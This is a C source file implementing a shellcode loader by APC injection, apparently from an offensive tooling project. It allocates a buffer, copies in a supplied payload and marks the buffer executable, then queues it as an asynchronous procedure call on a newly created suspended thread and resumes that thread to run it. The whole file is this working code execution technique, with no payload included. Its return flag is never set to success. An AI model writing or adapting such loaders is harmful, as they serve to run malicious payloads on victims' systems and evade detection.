#include "ApcInjection.h"

VOID AlertableFunction(VOID)
{

	Sleep(1);

}

BOOL RunViaApcInjection
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize,
	_In_ HANDLE ThreadHandle
)
{

	BOOL State			= FALSE;
	PVOID PayloadBuffer = NULL;
	DWORD OldProtection = 0;

	if (!(PayloadBuffer = VirtualAlloc(NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to Payload Buffer!", PayloadSize);
		PRINT_ERROR("VirtualAlloc");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Allocated %zu Bytes to Payload Buffer!", PayloadSize);

	RtlCopyMemory(PayloadBuffer, Payload, PayloadSize);

	INFO("Copied Payload To Payload Buffer!");
	INFO("[0x%p] Payload Buffer Address", PayloadBuffer);

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &OldProtection))
	{
		WARN("Failed To Change Memory Protection!");
		PRINT_ERROR("VirtualProtect");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Changed! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if (!(ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AlertableFunction, NULL, CREATE_SUSPENDED, NULL)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create a New Thread!");
		PRINT_ERROR("CreateThread");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Created!", ThreadHandle);
	INFO("Sending Thread to an Alertable State!");

	if (!QueueUserAPC((PAPCFUNC)PayloadBuffer, ThreadHandle, 0))
	{
		WARN("Failed To Queue Asynchronous Procedure Call!");
		PRINT_ERROR("QueueUserAPC");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Waiting For Thread to Finish Executing...");

	ResumeThread(ThreadHandle);

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle != NULL)
		CloseHandle(ThreadHandle);

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}